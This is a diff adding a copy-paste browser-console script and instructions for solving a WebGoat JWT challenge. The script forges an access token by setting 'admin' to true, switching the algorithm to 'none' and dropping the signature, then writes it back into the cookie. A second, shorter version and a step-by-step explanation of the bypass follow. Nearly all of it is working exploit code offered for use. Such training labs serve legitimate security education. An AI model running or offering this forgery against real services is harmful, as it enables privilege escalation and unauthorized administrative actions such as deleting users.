@@ -1,0 +1,85 @@
+========================================
+  COPY THIS → PASTE IN BROWSER CONSOLE
+========================================
+
+// STEP 1: Get your current token from cookie
+const currentToken = document.cookie.split('access_token=')[1]?.split(';')[0];
+
+if (!currentToken) {
+    console.error("❌ No access_token found in cookies!");
+    console.log("Make sure you're logged in to WebGoat");
+} else {
+    console.log("✓ Found token:", currentToken.substring(0, 50) + "...");
+    
+    // STEP 2: Decode and modify
+    const [header, payload, signature] = currentToken.split('.');
+    const payloadObj = JSON.parse(atob(payload.replace(/-/g, '+').replace(/_/g, '/')));
+    
+    console.log("✓ Original payload:", payloadObj);
+    
+    // Change admin to true
+    payloadObj.admin = "true";
+    
+    // STEP 3: Create "none" algorithm token
+    const noneHeader = btoa('{"alg":"none"}').replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+    const newPayload = btoa(JSON.stringify(payloadObj)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+    const attackToken = noneHeader + '.' + newPayload + '.';
+    
+    console.log("\n✓ Attack token created!");
+    console.log("Header: {alg: 'none'}");
+    console.log("Payload:", payloadObj);
+    console.log("\nFull token:", attackToken);
+    
+    // STEP 4: Set cookie
+    document.cookie = `access_token=${attackToken}; path=/`;
+    
+    console.log("\n✅ COOKIE UPDATED!");
+    console.log("\nNOW DO ONE OF THESE:");
+    console.log("1. Click the 'Reset Votes' button");
+    console.log("2. Refresh the page (F5)");
+    console.log("3. Click 'Delete' button next to any user");
+}
+
+========================================
+  INSTRUCTIONS:
+========================================
+
+1. Open WebGoat Challenge 1 page
+2. Press F12 to open DevTools
+3. Click "Console" tab
+4. Copy ALL the code above
+5. Paste in console
+6. Press Enter
+7. Click "Reset Votes" button OR refresh page
+
+✅ Challenge should complete!
+
+========================================
+  IF ERROR "admin is not defined":
+========================================
+
+Try this version with admin as boolean:
+
+const currentToken = document.cookie.split('access_token=')[1]?.split(';')[0];
+const [header, payload, signature] = currentToken.split('.');
+const payloadObj = JSON.parse(atob(payload.replace(/-/g, '+').replace(/_/g, '/')));
+payloadObj.admin = true;  // Boolean instead of string
+const noneHeader = btoa('{"alg":"none"}').replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+const newPayload = btoa(JSON.stringify(payloadObj)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+const attackToken = noneHeader + '.' + newPayload + '.';
+document.cookie = `access_token=${attackToken}; path=/`;
+console.log("Done! Click Reset Votes or refresh");
+
+========================================
+  WHAT'S HAPPENING:
+========================================
+
+1. Gets your current JWT from cookies
+2. Decodes the payload
+3. Changes admin: false → admin: true
+4. Changes algorithm: HS512 → none
+5. Removes signature
+6. Sets new cookie
+7. Server accepts it (algorithm "none" bypass!)
+
+========================================
